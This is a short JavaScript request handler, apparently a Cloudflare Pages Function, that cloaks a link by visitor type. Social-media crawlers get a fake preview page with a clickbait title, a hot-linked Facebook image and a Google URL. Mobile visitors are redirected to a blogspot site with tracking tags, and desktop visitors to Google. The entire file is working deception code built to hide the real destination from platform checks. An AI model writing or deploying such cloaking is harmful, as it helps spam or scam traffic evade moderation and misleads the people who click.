export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😱Quatuor en Afrique😱">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://scontent.fkhi5-2.fna.fbcdn.net/v/t39.30808-6/841230052_122118341067457417_2891144030295787441_n.jpg?stp=dst-jpg_tt6&cstp=mx720x417&ctp=s720x417&_nc_cat=111&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=127cfc&_nc_eui2=AeF85JWMZuM-oU1CMfardBTGWOo9mqIf1SpY6j2aoh_VKhmuym_dDAlGFDilIVv-DLFy9sroVPKbILYCG16u-nWS&_nc_ohc=PT0Z0Q8PcU0Q7kNvwH3oi3r&_nc_oc=AdppkVyIr1Lzu0cBSKAsY3sejMlhg8O5WHSDVGQZ-iNV9TwPSCbWgXEeLu8YLG-o0W-xW-GEgYtHvT1Qit7mn_Cu&_nc_zt=23&_nc_ht=scontent.fkhi5-2.fna&_nc_gid=Qbs5AeUJwL3HpjTtRhojvw&_nc_ss=782a8&oh=00_AQNXezgQUEVXx3hQykX1I1fRd2TqEO8DvVnZNsjSGWr42g&oe=6AD06FBF">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://waseey.blogspot.com/?utm_source=Ambani&utm_medium=Mumbai", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
